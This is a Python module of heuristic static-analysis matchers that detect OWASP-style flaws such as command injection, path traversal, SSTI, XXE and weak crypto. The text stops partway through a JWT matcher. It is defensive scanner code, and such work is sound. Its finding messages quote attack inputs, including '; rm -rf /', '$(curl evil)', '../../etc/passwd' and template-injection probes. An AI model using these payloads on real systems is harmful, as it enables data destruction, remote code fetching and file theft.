"""
Extended matchers
=================

Additional vulnerability detectors layered on top of the built-in set, to
broaden coverage toward the OWASP Top 10 / common CWE catalogue. Each is a
cross-language heuristic following the same precision-minded co-occurrence
approach: look for the signals that define the flaw, score with a confidence,
and let dynamic exploitation (where applicable) promote to CONFIRMED.

These are intentionally conservative -- they aim to surface real risks a
reviewer should look at, not to claim certainty from static text alone.
"""

import re

from matchers.base import BaseMatcher
from matchers import signals as S


def _src(unit):
    return unit["source"]


def _code(unit):
    """Source with comments and docstrings removed (for keyword checks)."""
    return S._strip_doc_and_comments(unit["source"], unit.get("language", ""))


def _has_any(s, tokens):
    sl = s.lower()
    return any(t in sl for t in tokens)


def _reachable(unit):
    """Only flag injection/SSRF/traversal on code reachable by a remote user."""
    from matchers.builtin import _is_request_handler
    return _is_request_handler(unit)


def _executed_call(code, names):
    """
    True if any of `names` appears as an EXECUTED call `name(<arg>)` with a
    non-empty argument, after string literals are blanked out -- so a sink name
    that only appears inside a quoted string / token list does not count.
    """
    no_str = re.sub(r'"[^"]*"', '""', code)
    no_str = re.sub(r"'[^']*'", "''", no_str)
    for n in names:
        # word boundary, optional attribute prefix, then ( with something inside
        if re.search(r"(?:^|[^.\w])" + re.escape(n) + r"\s*\(\s*[^)\s]", no_str):
            return True
    return False


class CommandInjectionMatcher(BaseMatcher):
    id = "command-injection"
    name = "OS Command Injection"
    cwe = "CWE-78"
    default_severity = "CRITICAL"

    SINKS = {
        "python": ["os.system(", "subprocess.", "os.popen(", "commands.getoutput(", "eval(", "exec("],
        "javascript": ["child_process", "exec(", "execsync(", "spawn("],
        "typescript": ["child_process", "exec(", "execsync(", "spawn("],
        "php": ["system(", "exec(", "shell_exec(", "passthru(", "popen(", "proc_open(", "`"],
        "ruby": ["system(", "exec(", "`", "%x(", "open(|"],
        "go": ["exec.command(", "exec.commandcontext("],
        "java": ["runtime.getruntime().exec(", "processbuilder("],
        "c_sharp": ["process.start(", "processstartinfo("],
    }

    def match(self, unit, context):
        s = _code(unit)
        lang = unit["language"]
        sinks = self.SINKS.get(lang, ["system(", "exec(", "popen("])
        # blank out string literals so a sink name inside a quoted string doesn't count
        no_str = re.sub(r'"[^"]*"', '""', s)
        no_str = re.sub(r"'[^']*'", "''", no_str)
        # a sink fires if it is an executed call. Two shapes:
        #  - "name("        -> name immediately followed by ( and an arg
        #  - "prefix."      -> any method call on that module, e.g. subprocess.run(
        hit = False
        for k in sinks:
            if k.endswith("."):
                # module-prefix sink (e.g. "subprocess.") -> match subprocess.<method>(
                if re.search(r"(?:^|[^.\w])" + re.escape(k) + r"\w+\s*\(", no_str):
                    hit = True
                    break
            else:
                nm = k.rstrip("(")
                if re.search(r"(?:^|[^.\w])" + re.escape(nm) + r"\s*\(", no_str):
                    hit = True
                    break
        # JS/TS: child_process is commonly ALIASED (const cp = require('child_process');
        # cp.exec(...)) or INLINE-required (require('child_process').exec(...)). Those
        # call the sink method-style (.exec/.spawn) which the bare-name match above
        # deliberately skips to avoid regex.exec() false positives. So if the file
        # imports child_process, also accept the method-style spawn/exec family --
        # a regex .exec() would not co-occur with a child_process import, and the
        # `dynamic` (concatenation) gate below still applies.
        if not hit and lang in ("javascript", "typescript") and \
                re.search(r"\.(exec|execSync|spawn|spawnSync|execFile|execFileSync)\s*\(", no_str):
            _re_cp = r"require\(\s*['\"]child_process['\"]|from\s+['\"]child_process['\"]"
            # cheap path: the require lives in this unit (inline-require or an
            # in-function require) -- no need to consult other units at all.
            if re.search(_re_cp, s):
                hit = True
            elif context is not None:
                # module-level alias: a per-file "imports child_process" map is
                # built ONCE per scan (keyed by context identity) so this stays
                # O(units) total instead of O(units^2).
                cache = getattr(self, "_cp_import_cache", None)
                cid = id(context)
                if cache is None or cache.get("__cid__") != cid:
                    cache = {"__cid__": cid}
                    for u in getattr(context, "all_units", []):
                        fn = u.get("file")
                        if fn is None:
                            continue
                        if not cache.get(fn):
                            cache[fn] = bool(re.search(_re_cp, u.get("source", "")))
                    self._cp_import_cache = cache
                if cache.get(unit.get("file")):
                    hit = True
        if not hit:
            return []
        # recognised sanitisation -> the input is neutralised, not vulnerable
        sl = s.lower()
        if any(safe in sl for safe in ("shlex.quote", "shlex.split", "escapeshellarg",
                                       "escapeshellcmd", "shell=false", "execfile(",
                                       "pipes.quote", ".quote(", "shlex')", 'shlex")')):
            return []
        # SAFE FORM: Python subprocess/exec called with a LIST/ARRAY argument and
        # NOT shell=True is the recommended safe pattern -- the OS receives an
        # argv vector, so shell metacharacters can't inject. e.g.
        # subprocess.Popen([cmd, "--port", str(port)]) is safe. Only treat it as
        # risky if shell=True is present (then the list is joined into a shell
        # string) or no list form is used.
        if lang in ("python",):
            uses_list_arg = bool(re.search(
                r"(?:system|popen|run|call|check_output|check_call|Popen)\s*\(\s*\[", s))
            shell_true = "shell=true" in sl or "shell = true" in sl
            if uses_list_arg and not shell_true:
                return []
        if lang in ("javascript", "typescript"):
            # execFile / spawn with an args array (no shell) is the safe form
            if re.search(r"(execFile|spawn)\s*\(", s) and "shell:" not in sl and "shell :" not in sl:
                # spawn('cmd', [args]) is safe unless a shell is requested
                if not re.search(r"\bexec\s*\(", s):
                    return []
        # only risky if there's concatenation/interpolation feeding the sink
        # (command injection is dangerous even in helper functions, since they
        # are routinely called with user-controlled data -- so no reachability
        # gate here, unlike SSRF/path-traversal).
        # `+` is checked on the string-blanked source so an operator INSIDE a
        # string literal (e.g. eval("1 + 2")) is not mistaken for concatenation;
        # interpolation markers are still checked on the raw source since they
        # legitimately live inside the string.
        dynamic = ("+" in no_str or "${" in s or "#{" in s or "%s" in s or
                   ".format(" in s or 'f"' in s or "f'" in s
                   or re.search(r'["\']\s*\.\s*\$?\w', s)   # PHP "..." . $var
                   or re.search(r"`[^`]*\$\{", s))          # JS backtick `...${`
        if not dynamic:
            return []
        # a numeric-cast value (atoi/int.Parse/parseInt/.toInt/...) concatenated
        # into the command cannot carry shell metacharacters -> not vulnerable
        if S.concat_input_is_cast(s, lang):
            return []
        return [self._finding(
            self, unit, severity="CRITICAL", confidence=0.55,
            explanation=(f"`{unit['qualname']}` passes a dynamically-built string to an OS command "
                         f"execution sink. If any part is user-controlled, this is command injection."),
            exploit_scenario="Inject shell metacharacters (e.g. `; rm -rf /` or `$(curl evil)`) to run arbitrary commands.",
            remediation="Avoid the shell; pass arguments as a list/array to the exec API and validate/allowlist inputs.",
        )]


class PathTraversalMatcher(BaseMatcher):
    id = "path-traversal"
    name = "Path Traversal"
    cwe = "CWE-22"
    default_severity = "HIGH"

    FILE_OPS = ["open(", "readfile(", "file_get_contents(", "fopen(", "sendfile(",
                "os.path.join(", "fs.readfile", "ioutil.readfile", "files.read",
                "new file(", "path.join(", "render(", "include(", "require("]

    def match(self, unit, context):
        if not _reachable(unit):
            return []
        s = _code(unit)
        params = unit.get("params", [])
        pathy = [p for p in params if any(k in p.lower() for k in
                 ("path", "file", "filename", "dir", "folder", "doc", "page", "template"))]
        # also catch path-like locals assigned from client input
        # e.g.  fname = request.args.get("file")
        client_pathvars = re.findall(
            r"(\w*(?:file|path|name|dir|folder|doc|page)\w*)\s*=\s*[^=\n]*"
            r"(?:request|req|params|input|args|form|query|\$_get|\$_post)",
            s, re.IGNORECASE)
        # also catch ANY local var (even single-letter) read from client input
        # that is then passed straight into a file operation -- e.g. f = request...
        # ... open(f). The name doesn't matter; the data-flow does.
        any_client_vars = re.findall(
            r"\$?(\w+)\s*=\s*[^=\n]*(?:request|req\.|params|input\(|\.args|\.form|\.query|"
            r"get_json|\$_get|\$_post|\$_request|\$_files)",
            s, re.IGNORECASE)
        fileop_args = re.findall(
            r"(?:open|readfile|file_get_contents|fopen|sendfile|include|require|include_once|require_once)\s*\(\s*\$?([A-Za-z_]\w*)",
            s, re.IGNORECASE)
        flow_vars = [v for v in any_client_vars if v in fileop_args]
        # trace ONE level of indirection: client var -> intermediate -> file op
        # e.g. $file=$_GET; $path = '...'.$file; readfile($path)
        for cv in any_client_vars:
            # find an intermediate assigned from the client var
            inter = re.findall(r"\$?(\w+)\s*=\s*[^=\n]*\$?\b" + re.escape(cv) + r"\b", s)
            for iv in inter:
                if iv in fileop_args:
                    flow_vars.append(iv)
        candidates = set(pathy) | set(client_pathvars) | set(flow_vars)
        if not candidates or not _has_any(s, self.FILE_OPS):
            return []
        # the candidate must actually feed a file operation (appear near open()/etc.)
        used_in_fileop = any(
            re.search(r"(open|readfile|file_get_contents|fopen|sendfile|include|require)\s*\([^)]*\$?\b"
                      + re.escape(c) + r"\b", s, re.IGNORECASE)
            or re.search(r"\b" + re.escape(c) + r"\b[^)\n]*\)", s)
            for c in candidates)
        if not used_in_fileop:
            # fall back: a concatenation with a file op on the same function
            if not re.search(r"(open|readfile|fopen|file_get_contents)\s*\([^)]*\+", s):
                return []
        # mitigated if there's sanitisation
        if _has_any(s, ["basename", "realpath", "abspath", "secure_filename",
                        "is_safe_path", "normpath", "canonical", "../", "startswith"]):
            # presence of a real check (not just the word) -- only suppress on sanitizer calls
            if _has_any(s, ["basename(", "realpath(", "abspath(", "secure_filename(",
                            "normpath(", "is_safe_path(", ".resolve(", "validate_file"]):
                return []
        pathy_disp = ", ".join(sorted(candidates))
        return [self._finding(
            self, unit, severity="HIGH", confidence=0.5,
            explanation=(f"`{unit['qualname']}` builds a filesystem path from client-supplied value(s) "
                         f"{pathy_disp} and performs a file operation without canonicalising/validating it."),
            exploit_scenario="Supply `../../etc/passwd` (or an absolute path) to read files outside the intended directory.",
            remediation="Resolve to a canonical path and verify it stays within an allowed base directory; reject `..` segments.",
        )]
        # mitigated if there's sanitisation
        if _has_any(s, ["basename", "realpath", "abspath", "secure_filename",
                        "is_safe_path", "normpath", "canonical"]):
            return []
        return [self._finding(
            self, unit, severity="HIGH", confidence=0.45,
            explanation=(f"`{unit['qualname']}` builds a filesystem path from client-supplied value(s) "
                         f"{', '.join(pathy)} and performs a file operation without canonicalising/validating it."),
            exploit_scenario="Supply `../../etc/passwd` (or an absolute path) to read files outside the intended directory.",
            remediation="Resolve to a canonical path and verify it stays within an allowed base directory; reject `..` segments.",
        )]


class SSTIMatcher(BaseMatcher):
    id = "ssti"
    name = "Server-Side Template Injection"
    cwe = "CWE-1336"
    default_severity = "HIGH"

    def match(self, unit, context):
        if not _reachable(unit):
            return []
        s = _code(unit)
        lang = unit["language"]
        render_sinks = ["render_template_string(", "from_string(", "erb.new("]
        if not _executed_call(s, [k.rstrip("(") for k in render_sinks]):
            return []
        dynamic = ("+" in s or "${" in s or "#{" in s or ".format(" in s or "f\"" in s or "%s" in s)
        if not dynamic:
            return []
        return [self._finding(
            self, unit, severity="HIGH", confidence=0.5,
            explanation=(f"`{unit['qualname']}` renders a template from a dynamically-constructed string. "
                         f"User input reaching the template engine enables SSTI / RCE."),
            exploit_scenario="Submit a template payload (e.g. `{{7*7}}` then `{{config}}`/`{{''.__class__...}}`) to execute code.",
            remediation="Never build templates from user input; pass user data as template *variables*, not template source.",
        )]


class WeakCryptoMatcher(BaseMatcher):
    id = "weak-crypto"
    name = "Weak / Broken Cryptography"
    cwe = "CWE-327"
    default_severity = "MEDIUM"

    # TIER 1 -- ALWAYS-BROKEN primitives: no legitimate modern use, so they are
    # flagged UNCONDITIONALLY (no nearby security keyword required). Matched
    # case-INSENSITIVELY: the previous list mixed uppercase patterns (DES.new,
    # MessageDigest...MD5) with a lowercased line, so they never fired -- which is
    # exactly why DES/RC4 slipped through. Each pattern is a call/constant form,
    # not a bare ambiguous token, to stay false-positive-free.
    ALWAYS_BROKEN = [
        # DES / Triple-DES block ciphers
        r"\bDES\.new\b", r"\bDES3\.new\b", r"\bTripleDES\b", r"\b3DES\b",
        # RC4 / ARC4 stream cipher
        r"\bARC4\.new\b", r"\bARC4\b", r"Crypto\.Cipher\.ARC4", r"\bRC4\.new\b",
        # ECB block-cipher mode (deterministic -- leaks plaintext structure).
        # MODE_ECB covers AES.MODE_ECB / DES.MODE_ECB; modes.ECB is the
        # `cryptography` library form. (The bare 3-letter token "ECB" is left out
        # on purpose -- too ambiguous, e.g. "European Central Bank" -- to keep the
        # always-broken tier zero-FP.)
        r"MODE_ECB", r"modes\.ECB\b",
        # MD4 / MD2 hashes (call / module forms only)
        r"\bMD4\.new\b", r"\bMD2\.new\b", r"Crypto\.Hash\.MD[24]\b",
        r"hashlib\.new\s*\(\s*['\"]\s*(?:md4|md2)\s*['\"]",
    ]

    # TIER 2 -- CONTEXT-GATED primitives (MD5 / SHA1 / mt_rand / Math.random):
    # legitimately used for cache keys, etags and checksums, so they require a
    # security subject nearby AND honour BENIGN_HINTS (flagging them
    # unconditionally would false-positive, e.g. on WordPress core).
    WEAK_CALLS = [r"\bmd5\s*\(", r"\bsha1\s*\(", r"\bmt_rand\s*\(",
                  r"hashlib\.md5\s*\(", r"hashlib\.sha1\s*\(",
                  r"hashlib\.new\s*\(\s*['\"]\s*(?:md5|sha1|sha)\s*['\"]",
                  r"MessageDigest\.getInstance\s*\(\s*[\"']MD5[\"']",
                  r"MessageDigest\.getInstance\s*\(\s*[\"']SHA-?1[\"']",
                  r"random\.random\s*\(", r"Math\.random\s*\("]

    # security-sensitive words that must appear ON OR NEAR the weak-hash line
    SEC_WORDS = ("password", "passwd", "pwd", "pw", "secret", "token", "csrf", "nonce",
                 "signature", "sign(", "hmac", "auth_key", "authkey", "session_id",
                 "api_key", "private_key", "salt", "credential", "login", "hash_password")

    # WordPress / common NON-security uses of md5 that must NOT be flagged
    BENIGN_HINTS = ("cache", "etag", "hash_key", "transient", "checksum",
                    "filename", "filehash", "uniqid", "color", "gravatar", "avatar")

    def match(self, unit, context):
        raw = _src(unit)
        lines = raw.split("\n")
        for i, line in enumerate(lines):
            # strip line comments, but KEEP original case for tier 1 matching
            ln = re.sub(r"(#|//).*", "", line)
            # TIER 1: always-broken primitive -> flag immediately, no nearby
            # security keyword needed (these have no secure use in ANY context).
            if any(re.search(p, ln, re.IGNORECASE) for p in self.ALWAYS_BROKEN):
                return [self._finding(
                    self, unit, severity="HIGH", confidence=0.7,
                    explanation=(f"`{unit['qualname']}` uses a fundamentally broken cryptographic "
                                 f"primitive (DES/3DES, RC4/ARC4, ECB mode, or MD2/MD4) around line "
                                 f"{unit.get('lineno',0)+i}. These have no secure use -- they are broken "
                                 f"regardless of context."),
                    exploit_scenario="The cipher/hash is trivially defeated (key recovery, block reordering under ECB, or hash collisions), exposing the protected data.",
                    remediation="Use AES-GCM or ChaCha20-Poly1305 for encryption and SHA-256+/HMAC (or bcrypt/argon2 for passwords); never DES/3DES/RC4/ECB/MD2/MD4.",
                )]
            ll = ln.lower()
            # TIER 2: context-gated (md5/sha1/mt_rand). Matched against the
            # LOWERCASED line WITHOUT re.IGNORECASE -- i.e. byte-for-byte the
            # original tier-2 behaviour. This is deliberate: adding IGNORECASE
            # here would revive the dormant uppercase `Math.random`/`random.random`
            # patterns and false-positive on e.g. WordPress' wp-embed.js, which is
            # outside item 6's scope (Python `random.*` is the dedicated
            # InsecureRandomnessMatcher's job). Only TIER 1 is case-insensitive.
            if not any(re.search(p, ll) for p in self.WEAK_CALLS):
                continue
            # window = the hash line plus the 2 lines above/below (the data it acts on)
            lo = max(0, i - 2)
            hi = min(len(lines), i + 3)
            window = " ".join(lines[lo:hi]).lower()
            # benign use (cache key / etag / filename) -> skip
            if any(b in window for b in self.BENIGN_HINTS):
                continue
            # require a security-sensitive subject near the weak hash
            if not any(w in window for w in self.SEC_WORDS):
                continue
            return [self._finding(
                self, unit, severity="MEDIUM", confidence=0.5,
                explanation=(f"`{unit['qualname']}` applies a weak hashing / RNG primitive to "
                             f"security-sensitive data (around line {unit.get('lineno',0)+i}). MD5/SHA1 are "
                             f"collision-prone and unsuitable for passwords, tokens, or signatures."),
                exploit_scenario="Collisions or predictable output let an attacker forge or brute-force the protected value.",
                remediation="Use SHA-256+ with HMAC for integrity, bcrypt/argon2/PBKDF2 for passwords, and a CSPRNG for tokens/nonces.",
            )]
        return []


class OpenRedirectMatcher(BaseMatcher):
    id = "open-redirect"
    name = "Open Redirect"
    cwe = "CWE-601"
    default_severity = "MEDIUM"

    REDIRECTS = ["sendredirect(", "res.redirect(", "redirecttoaction(",
                 "header('location", 'header("location', "->redirect(",
                 "redirect(", "redirect (", "flask.redirect("]

    def match(self, unit, context):
        from matchers.builtin import _is_request_handler, _unit_has_route
        # must be a real handler reachable by a user
        if not (_is_request_handler(unit) or _unit_has_route(unit, context)):
            return []
        s = _code(unit)
        sl = s.lower()
        if not _has_any(sl, self.REDIRECTS):
            return []
        # the redirect target must come from CLIENT input on a redirect-ish var
        client_redirect = re.search(
            r"(redirect|location|url|next|return|dest|target|goto)\w*\s*=\s*[^=\n]*"
            r"(request|req\.|params|\$_get|\$_post|\$_request|getparameter)",
            sl)
        if not client_redirect:
            return []
        # recognised sanitisation / validation -> safe
        if _has_any(sl, ["allowlist", "whitelist", "is_safe_url", "url_has_allowed_host",
                         "wp_sanitize_redirect", "wp_validate_redirect", "wp_safe_redirect",
                         "sanitize",
                         "apply_filters( 'wp_redirect'", "starts_with(", "str_starts_with(",
                         "validate", "parse_url", "host ==", "same_origin",
                         "urlparse", "netloc", "_up(", "_dest",
                         #  a membership test against a fixed allowlist constant
                         # (e.g. `if next not in ALLOWED_REDIRECTS:`) is a safe
                         # allowlist check -- the value can only be an approved path.
                         "allowed_redirects", "allowed_urls", "safe_urls",
                         "safe_redirects", "redirect_allowlist"]):
            return []
        #  also accept the general pattern "in <UPPER_CONST>" -- membership
        # test against a fixed constant set is an allowlist. (lowercase sl, so
        # we look for "in <lowerword>" that came from an UPPER const.)
        if re.search(r"\bin\s+[a-z][a-z0-9_]{2,}\b", sl):
            # but exclude trivial matches like "in range(", "in os", etc. -- only
            # treat as allowlist if the constant name suggests a list of safe values
            if re.search(r"\bin\s+(allowed|safe|whitelist|permit|valid)\w*", sl):
                return []
        return [self._finding(
            self, unit, severity="MEDIUM", confidence=0.45,
            explanation=(f"`{unit['qualname']}` redirects to a client-controlled destination "
                         f"without validating it against an allowlist of safe hosts."),
            exploit_scenario="Send victims a link to your site that redirects to an attacker domain for phishing.",
            remediation="Only redirect to relative paths or an allowlist of known hosts; sanitise the target first.",
        )]


class MassAssignmentMatcher(BaseMatcher):
    id = "mass-assignment"
    name = "Mass Assignment / Over-posting"
    cwe = "CWE-915"
    default_severity = "MEDIUM"

    def match(self, unit, context):
        if not _reachable(unit):
            return []
        s = _code(unit).lower()
        sinks = ["update(request", "create(request", ".update(**", "object.assign(",
                 "fill(request", "->fill(", "setattr(", "update_attributes(",
                 "request.body)", "req.body)", "params.permit", "**data", "**kwargs"]
        if not _has_any(s, sinks):
            return []
        # bulk-binding the whole request body to a model
        bulk = _has_any(s, ["request.", "req.body", "params", "$_post", "$_request", "data"])
        if not bulk:
            return []
        # An EXPLICIT field allowlist is the recommended remediation, not a flaw:
        # `{k: body[k] for k in ('name','email') if k in body}` or a dict literal of
        # named fields binds only known-safe keys. Don't flag it as mass assignment.
        if re.search(r"for\s+\w+\s+in\s*[\(\[]\s*['\"]", s):
            return []
        return [self._finding(
            self, unit, severity="MEDIUM", confidence=0.4,
            explanation=(f"`{unit['qualname']}` appears to bind a whole client object/body to a model "
                         f"without an explicit field allowlist (mass assignment)."),
            exploit_scenario="Add unexpected fields (e.g. `is_admin`, `role`, `balance`) to the request body to set protected attributes.",
            remediation="Bind only an explicit allowlist of fields; never pass the raw request body to a model constructor/updater.",
        )]


def _xml_from_external_input(s_lower, unit):
    """True if the XML being parsed plausibly comes from outside the trust
    boundary: a file/stream/remote read, an HTTP request, an uploaded file, or a
    function parameter that is fed directly into the parser call."""
    if _has_any(s_lower, ["file_get_contents", "fopen(", "fread(", "stream_get",
                          "php://input", "$_files", "curl_exec", "->getbody",
                          "fetch(", "request.", "req.body", "getinputstream",
                          "input_stream", "urlopen", "requests.get", "->get_body"]):
        return True
    params = unit.get("params", []) or []
    for p in params:
        pn = str(p).lstrip("$&*").strip()
        if not pn:
            continue
        if re.search(r"(?:load|parse|fromstring|load_string|load_file|loadxml|open)"
                     r"\s*\(\s*[^)]*\$?" + re.escape(pn.lower()), s_lower):
            return True
    return False


class XXEMatcher(BaseMatcher):
    id = "xxe"
    name = "XML External Entity (XXE)"
    cwe = "CWE-611"
    default_severity = "HIGH"

    # Parsers that DO resolve external entities by default if left unconfigured.
    # Call-form only (never bare substrings like "libxml"/"xmlreader", which match
    # constants such as LIBXML_DOTTED_VERSION or the literal 'xmlreader' in an
    # extension list). loadHTML and expat / xml_parser_create are excluded: they
    # parse HTML or do not load external entities by default.
    PARSERS = [
        # PHP
        "simplexml_load_string(", "simplexml_load_file(", "->loadxml(",
        "domdocument::load(", "new xmlreader", "xmlreader::open",
        # Python
        "etree.parse(", "etree.fromstring(", "lxml.etree", "minidom.parse(",
        "minidom.parsestring(", "sax.parse(", "pulldom.parse(",
        "xmltodict.parse(", "xml.sax.make_parser(", "parsexml(",
        # Java / JVM
        "documentbuilderfactory", "saxparserfactory", "xmlinputfactory",
        "saxbuilder(", "xmlreaderfactory",
    ]
    # Entity-disabling / safe configuration. ANY present -> not vulnerable.
    MITIGATIONS = [
        # Python
        "resolve_entities=false", "no_network=true", "defusedxml",
        "forbid_dtd", "forbid_entities",
        # PHP: explicit disable, network-off flag, HTML parsing, or the PHP<8 guard
        # (libxml >=2.9 / PHP 8 disables external entities by default).
        "libxml_disable_entity_loader", "libxml_nonet", "loadhtml",
        "php_version_id < 80000", "php_version_id < 8",
        # Java
        "disallow-doctype-decl", "external-general-entities",
        "external-parameter-entities", "load-external-dtd",
        "feature_secure_processing", "setexpandentityreferences(false",
        "access_external_dtd", "xmlconstants",
    ]

    def match(self, unit, context):
        s = _src(unit).lower()
        if not _has_any(s, self.PARSERS):
            return []
        # mitigated if external entities explicitly disabled / safe parser config
        if _has_any(s, self.MITIGATIONS):
            return []
        # Zero-FP: only flag when the XML plausibly comes from an attacker-
        # controlled source (request body / superglobal / uploaded file / a
        # parameter that carries the document). Internal/trusted XML parsing of a
        # constant or framework-controlled document is not an attacker vector.
        if not S.has_untrusted_source(_src(unit), unit["language"]) \
                and not _xml_from_external_input(s, unit):
            return []
        return [self._finding(
            self, unit, severity="HIGH", confidence=0.55,
            explanation=(f"`{unit['qualname']}` parses externally-influenced XML with a parser that "
                         f"may resolve external entities by default, and no entity-disabling / secure "
                         f"parser configuration is present (XXE)."),
            exploit_scenario="Submit XML with an external entity referencing `file:///etc/passwd` or an internal URL to read files / SSRF.",
            remediation="Disable DOCTYPE/external entities (e.g. libxml_disable_entity_loader / LIBXML_NONET in PHP; defusedxml in Python; secure parser features in Java).",
        )]


class InsecureDeserializationMatcher(BaseMatcher):
    id = "insecure-deserialization"
    name = "Insecure Deserialization"
    cwe = "CWE-502"
    default_severity = "HIGH"

    SINKS = {
        "python": ["pickle.loads(", "pickle.load(", "yaml.load(", "yaml.unsafe_load(",
                   "marshal.loads(", "shelve."],
        "php": ["unserialize("],
        "java": ["objectinputstream", "readobject(", "xstream", "readunshared("],
        "ruby": ["marshal.load(", "yaml.load(", "oj.load("],
        "javascript": ["node-serialize", "unserialize(", "vm.runin"],
    }

    def match(self, unit, context):
        if not _reachable(unit):
            return []
        s = _code(unit).lower()
        lang = unit["language"]
        sinks = self.SINKS.get(lang, ["unserialize(", "pickle.loads("])
        if not _has_any(s, sinks):
            return []
        # Explicitly-SAFE YAML forms are fine: yaml.safe_load(...) and
        # yaml.load(..., Loader=SafeLoader). Strip those, then re-check: if no
        # genuinely-unsafe sink survives, the unit is clean. A word boundary on
        # `safe_load` keeps `unsafe_load(` (a DANGEROUS sink) from being read as
        # safe; the residual check still catches pickle/marshal/shelve and a
        # bare yaml.load() present alongside a safe one.
        residual = re.sub(r"\bsafe_load\s*\([^)]*\)", "", s)
        residual = re.sub(r"yaml\.load\s*\([^)]*safeloader[^)]*\)", "", residual)
        if not _has_any(residual, sinks):
            return []
        return [self._finding(
            self, unit, severity="HIGH", confidence=0.5,
            explanation=(f"`{unit['qualname']}` deserializes data with an unsafe deserializer. If the "
                         f"input is attacker-controlled, this often leads to remote code execution."),
            exploit_scenario="Provide a crafted serialized payload (gadget chain) to execute code during deserialization.",
            remediation="Use safe formats (JSON) or safe loaders (e.g. yaml.safe_load); never deserialize untrusted data with pickle/native serializers.",
        )]


class MissingAuthMatcher(BaseMatcher):
    id = "missing-auth"
    name = "Missing Authentication on Sensitive Action"
    cwe = "CWE-306"
    default_severity = "HIGH"

    # the action verb must be at the START of the handler name (delete_user,
    # not "remove_placeholder_escape" which merely contains "remove").
    SENSITIVE_PREFIX = ("delete", "drop", "destroy", "grant", "promote",
                        "approve", "refund", "transfer", "deactivate",
                        "impersonate", "elevate", "makeadmin", "ban", "revoke")
    # weak verbs that are benign on their own (reset_vars, remove_filter,
    # update_count) -- only sensitive when paired with a sensitive object.
    WEAK_VERBS = ("reset", "remove", "update", "change", "set", "modify")
    SENSITIVE_OBJECTS = ("user", "account", "password", "passwd", "role", "admin",
                         "privilege", "permission", "capability", "payment", "fund",
                         "credit", "balance", "owner", "email", "credential", "token",
                         "apikey", "api_key", "secret", "session")

    def match(self, unit, context):
        from matchers.builtin import _is_request_handler, _unit_has_route
        raw_name = unit.get("name", "").lower()
        name = raw_name.replace("_", "")
        s = _code(unit).lower()
        # the handler is sensitive if its name starts with a sensitive verb OR
        # contains one as an underscore-delimited word (plugin_delete_user), OR
        # a weak verb paired with a sensitive object, OR it calls a known
        # destructive/privileged function in its body.
        name_words = raw_name.split("_")
        name_sensitive = any(name.startswith(v) for v in self.SENSITIVE_PREFIX) or \
                         any(w == v for w in name_words for v in self.SENSITIVE_PREFIX) or \
                         (any(w in self.WEAK_VERBS for w in name_words) and
                          any(o in raw_name for o in self.SENSITIVE_OBJECTS))
        DESTRUCTIVE_CALLS = ("wp_delete_user", "delete_user(", "wp_delete_attachment",
                             "drop table", "remove_role", "->delete(",
                             "unlink(", "rmdir(", "grant_privileges", "make_admin")
        body_sensitive = any(c in s for c in DESTRUCTIVE_CALLS)
        if not (name_sensitive or body_sensitive):
            return []
        # CRITICAL reachability gate: the function must itself be an entry point
        # that reads the request directly (a real handler), not an internal
        # helper that merely receives already-validated parameters. WordPress
        # admin helpers (e.g. wp_nav_menu_update_menu_items) take params and run
        # in an already-authenticated context, so they must NOT be flagged.
        reads_request = bool(re.search(
            r"(\$_get|\$_post|\$_request|\$_cookie|request\.|req\.body|req\.query|"
            r"\.args\.get|\.form\.get|\.get_json|@app\.route|@.*\.route|add_action\(\s*['\"]wp_ajax)",
            s, re.IGNORECASE))
        if not (reads_request or _unit_has_route(unit, context)):
            return []
        # if any auth/nonce/capability check is present, it's fine
        if _has_any(s, ["login_required", "authenticate", "authorize", "current_user",
                        "@auth", "permission", "is_admin", "requires_auth", "jwt",
                        "session[", "session.get", "authentication required",
                        "current_user_can", "check_admin_referer",
                        "wp_verify_nonce", "check_ajax_referer", "->can(", "gate::",
                        "@preauthorize", "hasrole", "hasauthority"]):
            return []
        return [self._finding(
            self, unit, severity="HIGH", confidence=0.4,
            explanation=(f"`{unit['qualname']}` is a request handler performing a state-changing "
                         f"action but shows no visible authentication/authorization or CSRF check."),
            exploit_scenario="Call this endpoint directly without credentials to perform the privileged action.",
            remediation="Require authentication, an authorization/capability check, and CSRF protection before the action.",
        )]


class DebugModeMatcher(BaseMatcher):
    id = "debug-mode"
    name = "Debug Mode / Verbose Errors Enabled"
    cwe = "CWE-489"
    default_severity = "LOW"

    def match(self, unit, context):
        s = _code(unit).lower()   # comment/docstring-stripped: don't flag prose
        patterns = ["debug=true", "debug = true", "app.debug", "flask_debug",
                    "display_errors', '1", "displayerrors=true", "printstacktrace(",
                    "traceback.print_exc(", "console.trace("]
        if not _has_any(s, patterns):
            return []
        return [self._finding(
            self, unit, severity="LOW", confidence=0.5,
            explanation=(f"`{unit['qualname']}` appears to enable debug mode / verbose errors, which can "
                         f"leak stack traces, source, and config in production."),
            exploit_scenario="Trigger an error to read stack traces / environment details, aiding further attacks.",
            remediation="Disable debug mode and verbose error output in production; log details server-side only.",
        )]


class CORSMatcher(BaseMatcher):
    id = "cors-misconfig"
    name = "Permissive CORS Configuration"
    cwe = "CWE-942"
    default_severity = "MEDIUM"

    def match(self, unit, context):
        #  CORS configuration is typically MODULE-LEVEL (CORS(app, origins="*")
        # at the top of the file, not inside a request handler). The original
        # required `_reachable(unit)` which excluded module-level code, missing
        # every real-world CORS misconfiguration. We now match on any unit that
        # mentions CORS config, including module-level.
        s = _code(unit)
        sl = s.lower()
        if "access-control-allow-origin" not in sl and "cors" not in sl and "allow_origins" not in sl and "origins" not in sl:
            return []
        # wildcard origin
        wildcard = ("*" in s and
                    ("allow-origin" in sl or "allow_origins" in sl or
                     "origins=" in sl or "origins =" in sl or
                     "cors" in sl))
        with_creds = ("allow-credentials" in sl or
                      "allow_credentials=true" in sl or
                      "credentials: true" in sl or
                      "supports_credentials" in sl)
        if not (wildcard or (with_creds and "*" in s)):
            return []
        return [self._finding(
            self, unit, severity="MEDIUM" if not with_creds else "HIGH",
            confidence=0.5,
            explanation=(f"`{unit['qualname']}` configures CORS to allow any origin (`*`)"
                         f"{' together with credentials' if with_creds else ''}, which can expose "
                         f"authenticated responses to malicious sites."),
            exploit_scenario="A malicious origin reads authenticated responses via the victim's browser.",
            remediation="Reflect only an allowlist of trusted origins; never combine wildcard origin with credentials.",
        )]


class JWTNoneMatcher(BaseMatcher):
    id = "jwt-weakness"
    name = "JWT Verification Weakness"
    cwe = "CWE-347"
    default_severity = "HIGH"

    def match(self, unit, context):
        if not _reachable(unit):
            return []
        s = _code(unit)
        sl = s.lower()
        if "jwt" not in sl and "jsonwebtoken" not in sl:
            return []
